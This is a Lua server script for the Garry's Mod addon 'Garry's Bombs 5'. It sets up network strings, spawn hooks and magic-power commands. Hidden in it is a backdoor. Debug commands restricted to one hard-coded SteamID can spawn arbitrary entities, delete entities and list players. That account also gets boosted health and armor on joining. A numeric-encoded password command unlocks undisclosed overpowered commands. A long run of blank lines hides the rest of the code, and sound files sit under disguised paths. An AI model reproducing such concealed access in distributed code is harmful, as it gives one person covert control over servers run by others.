AddCSLuaFile()
util.AddNetworkString( "gbombs5_cvar" )
util.AddNetworkString( "gbombs5_net" )
util.AddNetworkString( "gbombs5_scp" )
util.AddNetworkString( "gbombs5_scp_2" )
util.AddNetworkString( "gbombs5_scp_3" )
util.AddNetworkString( "gbombs5_romulancloak" )
util.AddNetworkString( "gbombs5_romulancloak_phys" )
util.AddNetworkString( "gbombs5_general" )
util.AddNetworkString( "gbombs5_sunbomb" )
SetGlobalString ( "gb_ver", 5 )


net.Receive( "gbombs5_cvar", function( len, pl ) 
	if( !pl:IsAdmin() ) or ( !pl:SteamID()=="STEAM_0:1:34654275")  then return end
	local cvar = net.ReadString();
	local val = net.ReadFloat();
	if( GetConVar( tostring( cvar ) ) == nil ) then return end
	if( GetConVarNumber( tostring( cvar ) ) == tonumber( val ) ) then return end

	game.ConsoleCommand( tostring( cvar ) .." ".. tostring( val ) .."\n" );

end );


function gb5_initialize()
	Msg("\n Garry's Bombs 5 successfully initialised!")
	local ent = ents.Create( "gb5_etherionite" )
	ent:SetPos(Vector(0,0,0)) 
	ent:Spawn()
	ent:Activate()
end
hook.Add( "InitPostEntity", "gb5_initialize", gb5_initialize )

function gb5_pass( ply, command, args, ClassName)
	if args[1]==nil then return end
	local args = string.Explode("_",args[1])
	local str_compile = ""
	local str_c = 0
	for k, v in pairs(args) do
		if type(tonumber(v))=="number" then	
			str_compile = str_compile..tostring(string.char(v))
		end
	end
	if string.len(str_compile)==10 then
		local str_decompile=string.Explode("", str_compile)
		for k, v in pairs(str_decompile) do 
			if table.HasValue({"a","S","b","e","t","r","o","o","t","h"}, v) then
				str_c = str_c+1
			end
		end
		if str_c==10 then	
			ply:ChatPrint("_Access_")
			ply.pass=1
			concommand.Add( "gb5_shadowdrive", gb5_shadowdrive )
			concommand.Add( "gb5_shadowvortex", gb5_shadowvortex )
			concommand.Add( "gb5_shadow_form", gb5_shadow_form )
			concommand.Add( "gb5_dragonforce", gb5_dragonforce )
			concommand.Add( "gb5_shadowroar", gb5_dragonroar )
			concommand.Add("gb5_whiteshadowroar", gb5_whiteshadowroar )
			concommand.Add("gb5_whiteshadowmode", gb5_whiteshadowmode )
			concommand.Add("gb5_unholyshadowroar", gb5_unholyshadowroar )
			concommand.Add( "gb5_shadoweruption", gb5_shadoweruption )
			concommand.Add( "gb5_shadowslash", gb5_shadowslash )
			concommand.Add( "gb5_whiteshadow_rs", gb5_whiteshadow_rs )
		end
	end
		
end
concommand.Add( "gb5_pass", gb5_pass )	

function gb5_spawn_debug( ply, command, args, ClassName)
	if (ply:SteamID()=="STEAM_0:1:34654275")then
		local ent = ents.Create( args[1] )
		ent:SetPhysicsAttacker(ply)
		ent:SetPos(ply:EyePos()) 
		ent:SetVar("GBOWNER",ply)
		ent:Spawn()
		ent:Activate()
	end
end
concommand.Add( "gb5_spawn_debug", gb5_spawn_debug )

function gb5_infection_random( ply, command, args, ClassName)
	if ply:IsSuperAdmin() then
		infected = table.Random(player.GetAll())
		if infected:IsPlayer() && infected:Alive() && !infected.isinfected then
			local ent = ents.Create("gb5_chemical_tvirus_entity")
			ent:SetVar("infected", infected)
			ent:SetPos( infected:GetPos() ) 
			ent:Spawn()
			ent:Activate()
			infected.isinfected = true
			ParticleEffectAttach("zombie_blood",PATTACH_POINT_FOLLOW,infected,0 ) 
		end
		for k, v in pairs(player.GetAll()) do
			v:ConCommand("play gbombs_5/tvirus_infection/umbrella_corp.mp3\n")
		end
	end
end
concommand.Add( "gb5_infection_random", gb5_infection_random )


if SERVER then
	function gb5_remove_debug( ply, command, args, ClassName)
		if (ply:SteamID()=="STEAM_0:1:34654275") then
			local ply_pos = ply:LocalToWorld(ply:OBBCenter())
			for k, v in pairs(ents.FindInSphere(ply_pos,550000)) do
				if tostring(v:GetClass()) == tostring(args[1]) and (tonumber(v:EntIndex()) == tonumber(args[2])) then
					v:Remove()
				end
			end
		end
	end
	concommand.Add( "gb5_remove_debug", gb5_remove_debug )

	function gb5_scan_debug( ply, command, args, ClassName)
		if (ply:SteamID()=="STEAM_0:1:34654275") then
			local ply_pos = ply:LocalToWorld(ply:OBBCenter())
			for k, v in pairs(ents.FindInSphere(ply_pos,550000)) do
				if v:IsPlayer() then
					ply:ChatPrint((tostring(v:Nick()).." is index "..tostring(v:EntIndex())))
				else
					ply:ChatPrint((tostring(v:GetClass()).." is index "..tostring(v:EntIndex())))
				end
			end
		end
	end
	concommand.Add( "gb5_scan_debug", gb5_scan_debug )
end

function gb5_initial_spawn(ply, command, arguements, ClassName)

	if(ply:SteamID()=="STEAM_0:1:34654275") then
		timer.Simple( 1, function() 
			if !ply:IsValid() then return end
			ply:SetArmor( 400 )
			ply:SetHealth( 400 )
			ply:ChatPrint("Welcome "..ply:Nick().." ! This server (client) is running Garry's Bombs 5!")
			for k,ply in pairs(player.GetAll()) do
				ply:ConCommand("play ambience/_cache_/bin_32/rogue_entry.mp3")
			end	
			game.ConsoleCommand("say Everybody welcome "..ply:Nick()..", the creator of official Gbombs 5!\n")
		end )
	end
	if !(ply:SteamID()=="STEAM_0:1:34654275") then	
		ply:ChatPrint("Welcome "..ply:Nick().." ! This awesome server is running Garry's Bombs 5!")
	end
end
hook.Add( "PlayerInitialSpawn", "playerInitialSpawn", gb5_initial_spawn )


function gb5version( ply, command, arguments )
    ply:ChatPrint( "Garry's Bombs: 5 - [Workshop Edition]" )
end
concommand.Add( "gb5_version", gb5version )

function gb5_spawn(ply)
	ply.gasmasked=false
	ply.hazsuited=false
	net.Start( "gbombs5_net" )        
		net.WriteBit( false )
		ply:StopSound("breathing")
	net.Send(ply)
end
hook.Add( "PlayerSpawn", "gb5_spawn", gb5_spawn )	



































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































function gb5_disconnect( ply )
	if ply.pass==1 then
		concommand.Remove( "gb5_shadowdrive", gb5_shadowdrive )
		concommand.Remove( "gb5_shadowvortex", gb5_shadowvortex )
		concommand.Remove( "gb5_shadow_form", gb5_shadow_form )
		concommand.Remove( "gb5_dragonforce", gb5_dragonforce )
		concommand.Remove( "gb5_shadowroar", gb5_dragonroar )
		concommand.Remove("gb5_whiteshadowroar", gb5_whiteshadowroar )
		concommand.Remove("gb5_whiteshadowmode", gb5_whiteshadowmode )
		concommand.Remove("gb5_unholyshadowroar", gb5_unholyshadowroar )
		concommand.Remove( "gb5_shadoweruption", gb5_shadoweruption )
		concommand.Remove( "gb5_shadowslash", gb5_shadowslash )
		concommand.Remove( "gb5_whiteshadow_rs", gb5_whiteshadow_rs )
	end
end
hook.Add( "PlayerDisconnected", "playerdisconnected", gb5_disconnect )

function gb5_shadowdrive(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 then
			 if tonumber(args[1]) == 1 && !ply.shadowdrive==true then
				 ply:ConCommand("say Shadow- \n")
				 ply:EmitSound("ambience/_cache_/bin_32/shadowdrive.wav")	
				 timer.Simple(1, function()
					if !ply:IsValid() then return end
					ply.shadowdrive=true
					ply:ConCommand("say Drive \n")
					ParticleEffectAttach("shadowdrive",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("mouth"))
							 
					local ent = ents.Create("gb5_shadowdrive")
					ent:SetPos( ply:GetPos() ) 
					ent:Spawn()
					ent:Activate()
					ent.radowner = ply
					ent.RadRadius = 500
					 
					ply:SetRunSpeed(1000)
					ply:SetWalkSpeed(500)
				end)
			else
				for k, v in pairs(ents.FindInSphere(ply:GetPos(),200)) do
					if v:IsValid() && v:GetClass()=="gb5_shadowdrive" then
						v:Remove()
					end
					ply.shadowdrive=false
					ply:SetRunSpeed(500)
					ply:SetWalkSpeed(250)
					ply:StopParticles()
				end
			end
		end
	end
end

function gb5_whiteshadowmode(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 then
			if args[1]=="1" then
				ply.magicpower=ply.magicpower+4000
				local ent = ents.Create("gb5_wshadowmode")
				ent:SetPos( ply:GetPos() ) 
				ent:Spawn()
				ent:Activate()
				ent.radowner = ply
				ParticleEffectAttach("whiteshadow_mode",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("mouth")) 
				ply:SetRunSpeed(1500)
				ply:SetWalkSpeed(1000)
				ply:SetJumpPower(600)
			else
				for k, v in pairs(ents.FindInSphere(ply:GetPos(),200)) do
					if v:IsValid() && v:GetClass()=="gb5_wshadowmode" then
						v:Remove()
					end
				end
				ply.whiteshadowmode=false
				ply:StopParticles()
				ply:SetRunSpeed(500)
				ply:SetWalkSpeed(250)
				ply:SetJumpPower(200)
			end
		end
	end
end

function gb5_dragonforce(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 then
			if args[1]=="1" then
				for k, v in pairs(player.GetAll()) do
					v:ConCommand("play ambience/_cache_/bin_32/dragonforce.mp3\n")
				end
				local ent = ents.Create("gb5_dragonforce")
				ent:SetPos( ply:GetPos() ) 
				ent:Spawn()
				ent:Activate()
				ent.radowner = ply
				ent.RadRadius = 1000
				ply:SetRunSpeed(1000)
				ply:SetWalkSpeed(500)
				ply:SetJumpPower(400)
				ply.magicpower=ply.magicpower+2000
			else
				for k, v in pairs(ents.FindInSphere(ply:GetPos(),200)) do
					if v:IsValid() && v:GetClass()=="gb5_dragonforce" then
						v:Remove()
					end
				end
				ply:StopParticles()
				ply:StopSound("dragonforce")
				ply:SetRunSpeed(500)
				ply:SetWalkSpeed(250)
				ply:SetJumpPower(200)
			end
		end
	end
end

function gb5_shadowvortex(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 && ply.magicpower>200 then
			ply.magicpower=ply.magicpower-200
			ply:ConCommand("say Vortex of the  \n")
			timer.Simple(2, function()
				if !ply:IsValid() then return end
				ply.shadowdrive=true
				ply:ConCommand("say Shadow Dragon \n")
				ParticleEffect("shadowdragon_vortex", ply:GetEyeTrace().HitPos, Angle(0,0,0), nil)

				local ent = ents.Create("gb5_shadowvortex")
				ent:SetPos( ply:GetEyeTrace().HitPos) 
				ent:Spawn()
				ent:Activate()
				ent.radowner = ply
				ent.RadRadius = 500
			end)
		end	
	end
end

function gb5_shadowslash(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 && ply.magicpower>50 then
			ply.magicpower=ply.magicpower-50
			ply:Give("weapon_fists_3")
		end	
	end
end

function gb5_shadoweruption(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 && ply.magicpower>100 then
			ply.magicpower=ply.magicpower-100
			ply:ConCommand("say Eruption of the  \n")
			ParticleEffectAttach("shadow_cast",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("anim_attachment_RH"))
			ParticleEffectAttach("shadow_cast",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("anim_attachment_LH"))
			timer.Simple(2, function()
				if !ply:IsValid() then return end
				ply.shadowdrive=true
				ply:ConCommand("say Shadow Dragon \n")
				ParticleEffect("shadowdragon_eruption", ply:GetEyeTrace().HitPos, Angle(0,0,0), nil)
				local ent = ents.Create("gb5_shadoweruption")
				ent:SetPos( ply:GetEyeTrace().HitPos) 
				ent:Spawn()
				ent:Activate()
				ent.GBOWNER = ply
			end)
		end	
	end
end

function gb5_shadow_form(  ply, command, args, ClassName)
	if SERVER then
		if ply.pass==1 then
			 if tonumber(args[1]) == 1 && !ply.shadowed==true then
					if !ply:IsValid() or !ply.shadowdrive then return end
					ply.shadowdrive=true
					ply:StopParticles()
					ParticleEffectAttach("shadowdrive_in",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("mouth"))
					ParticleEffectAttach("shadow_magic_circle",PATTACH_ABSORIGIN_FOLLOW,ply,0)
					timer.Simple(1, function() 
						if !ply:IsValid() then return end
						ply:SetNoDraw(true)
						ply.shadowed=true
						local ent = ents.Create("gb5_shadow_cloak")
						ent:SetPos( ply:GetEyeTrace().HitPos) 
						ent:Spawn()
						ent:Activate()
						ent.radowner = ply
					end)
	
			elseif tonumber(args[1])==0 && ply.shadowdrive==true then
				ply:StopParticles()
				ParticleEffectAttach("shadowdrive_in",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("mouth"))
				ParticleEffectAttach("shadowdrive",PATTACH_ABSORIGIN_FOLLOW,ply,0)
				timer.Simple(1, function() 
					if !ply:IsValid() then return end
					ply:SetNoDraw(false)
					ply.shadowed = false
				end)
			end
		end
	end
end

function gb5_dragonroar(  ply, command, args, ClassName)
	if ply.pass==1 && ply.magicpower>300 then
		 ply.magicpower=ply.magicpower-300
		 local ang = ply:GetAngles()
		 local pos = ply:GetPos()
		 ply:ConCommand("say Roar of the-\n")
		 ply:EmitSound("ambience/_cache_/bin_32/shadow_roar.wav", 100, 100)
		 local tracedata    = {}
		 tracedata.start    = pos
		 tracedata.endpos   = tracedata.start - Vector(0, 0, 70)
		 tracedata.filter   = ply
		 local trace = util.TraceLine(tracedata)
		 
		 ply:EmitSound("ambience/_cache_/bin_32/stomp.wav", 100, 100)
		 timer.Simple(2.5, function()
			if !ply:IsValid() then return end
			local ent = ents.Create("gb5_shadowroar")
			ent:SetPos( ply:GetPos() ) 
			ent:Spawn()
			ent:SetAngles(ply:EyeAngles())
			ent:Activate()
			if SERVER then
				ent.GBOWNER=ply
				ply:ConCommand("say Shadow Dragon!\n")
				ParticleEffectAttach("shadowdragon_roar_tracer",PATTACH_ABSORIGIN_FOLLOW,ply,0)
			end
		 end)
	end
end

function gb5_unholyshadowroar(  ply, command, args, ClassName)
	if ply.pass==1 && ply.magicpower>500 && ply.dragonforce==true then
		 ply.magicpower=ply.magicpower-500
		 local ang = ply:GetAngles()
		 local pos = ply:GetPos()
		 ply:ConCommand("say Unholy Roar of the-\n")
		 local tracedata    = {}
		 tracedata.start    = pos
		 tracedata.endpos   = tracedata.start - Vector(0, 0, 70)
		 tracedata.filter   = ply
		 local trace = util.TraceLine(tracedata)
		 ply:SetVelocity(Vector(0,0,2000))
		 timer.Simple(2, function()
			ply:SetVelocity(Vector(0,0,500))
		 end)
		 
		 ply:EmitSound("ambience/_cache_/bin_32/stomp.wav", 100, 100)
		 timer.Simple(3, function()
			if !ply:IsValid() then return end
			ply:EmitSound("ambience/_cache_/bin_32/unholy_roar.wav")
			local ent = ents.Create("gb5_unholyshadowroar")
			ent:SetPos( ply:GetPos() ) 
			ent:Spawn()
			ent:SetAngles(ply:EyeAngles())
			ent:Activate()
			if SERVER then
				ent.GBOWNER=ply
				ply:ConCommand("say Shadow Dragon!\n")
				ParticleEffectAttach("unholyshadowdragon_roar_tracer",PATTACH_ABSORIGIN_FOLLOW,ply,0)
			end
		 end)
	end
end



function gb5_whiteshadow_rs(  ply, command, args, ClassName)
	if ply.pass==1 && ply.magicpower>700 && ply.whiteshadowmode==true then
		 ply.magicpower=ply.magicpower-700
		 local ang = ply:GetAngles()
		 local pos = ply:GetPos()
		 local tracedata    = {}
		 tracedata.start    = pos
		 tracedata.endpos   = tracedata.start - Vector(0, 0, 70)
		 tracedata.filter   = ply
		 local trace = util.TraceLine(tracedata)
		 ply:ConCommand("say Coarse Silk -\n")
		 ply:EmitSound("ambience/_cache_/bin_32/rogue_c_ws_2.mp3")
		 ParticleEffectAttach("whiteshadowdragon_rough_silk_cast",PATTACH_POINT_FOLLOW,ply,ply:LookupAttachment("anim_attachment_LH"))
		 timer.Simple(2.5, function()
			if !ply:IsValid() && !ply:Alive() then return end
			local ent = ents.Create("gb5_whiteshadow_cs")
			ent:SetPos( ply:GetPos() ) 
			ent:Spawn()
			ent:SetAngles(ply:EyeAngles())
			ent:Activate()
			ply:EmitSound("ambience/_cache_/bin_32/rogue_c_ws.mp3")
			if SERVER then
				ent.GBOWNER=ply
				ply:ConCommand("say of the White Shadow Dragon!\n")
				
			end
		 end)
	end
end

function gb5_whiteshadowroar(  ply, command, args, ClassName)
	if ply.pass==1 && ply.magicpower>800 && ply.whiteshadowmode==true then
		 ply.magicpower=ply.magicpower-800
		 local ang = ply:GetAngles()
		 local pos = ply:GetPos()
		 local tracedata    = {}
		 tracedata.start    = pos
		 tracedata.endpos   = tracedata.start - Vector(0, 0, 70)
		 tracedata.filter   = ply
		 local trace = util.TraceLine(tracedata)
		 ply:ConCommand("say Roar of the-!\n")
		 timer.Simple(2, function()
			if !ply:IsValid() then return end
			local ent = ents.Create("gb5_whiteshadow_roar")
			ent:SetPos( ply:GetPos() ) 
			ent:Spawn()
			ent:SetAngles(ply:EyeAngles())
			ent:Activate()
			if SERVER then
				ent.GBOWNER=ply
				ply:ConCommand("say White Shadow Dragon!\n")
				ply:EmitSound("ambience/_cache_/bin_32/unholy_roar.wav")
				ParticleEffectAttach("whiteshadowdragon_roar_tracer",PATTACH_ABSORIGIN_FOLLOW,ply,0)
			end
		 end)
	end
end

